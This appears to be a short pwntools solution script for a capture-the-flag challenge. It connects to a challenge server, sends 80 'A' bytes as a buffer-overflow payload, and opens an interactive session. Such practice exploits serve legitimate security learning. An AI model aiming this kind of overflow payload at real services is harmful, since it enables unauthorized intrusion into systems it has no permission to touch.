from pwn import *
r = remote("chal.zense.co.in",6701)
payload = b'A'*80
r.sendline(payload)
r.interactive()
